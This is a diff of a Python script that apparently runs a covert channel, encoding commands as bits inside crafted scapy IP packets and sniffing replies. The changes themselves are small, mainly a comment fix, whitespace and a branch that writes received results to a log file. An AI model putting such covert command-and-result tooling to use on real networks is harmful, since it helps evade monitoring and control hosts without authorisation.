@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 import optparse
-import os
+import os.path
 import subprocess
 import sys
 import time
@@ -44,7 +44,7 @@ def secret_send(msg: str, type: str = 'command'):
     type     - file or command (default:command)
     """
     if(type == "command"):
-        # Convert message to ASCII to bits
+        # Convert message from ASCII to bits
         msg = message_to_bits(msg)
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
@@ -53,10 +53,10 @@ def secret_send(msg: str, type: str = 'command'):
 
 def packatizer(msg):
     """[summary]
-    
+
     Arguments:
         msg {[type]} -- [description]
-    
+
     Returns:
         [list of scapy.packets] -- [description]
     """
@@ -84,10 +84,10 @@ def packatizer(msg):
 
 def craft(data: str) -> IP:
     """[summary]
-    
+
     Arguments:
         data {str} -- [description]
-    
+
     Returns:
         IP -- [description]
     """
@@ -124,7 +124,7 @@ def server():
 
 def commandResult(packet):
     """[summary]
-    
+
     Arguments:
         packet {[type]} -- [description]
     """
@@ -146,8 +146,13 @@ def commandResult(packet):
             payload = str(''.join(messages)[2:-2]).replace("\\n", '\n')
             print('\n', payload)
             messages = []
-        elif flag == "P":
-            #writes messages to file
+        elif flag == 0x08:
+            log_file = '/root/Documents/temp/file.log'
+            #checks if log file exists in specific directory
+            if os.path.isfile(log_file):
+                os.remove(log_file)
+            with open(log_file, 'w+') as f:
+                f.write('{}'.format(str(''.join(messages)[2:-2]).replace("\\n", '\n')))
 
 
 def commandSniffer():
